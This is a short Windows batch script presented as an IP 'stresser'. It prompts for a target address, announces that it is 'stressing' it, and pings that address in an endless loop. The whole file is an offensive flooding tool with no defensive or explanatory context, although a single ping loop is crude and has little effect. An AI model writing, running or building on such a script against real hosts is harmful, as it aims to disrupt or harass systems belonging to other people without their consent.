@echo off
set /p id=Enter IP Address: 
echo Now stressing %id%...

:x
ping %id%
goto x
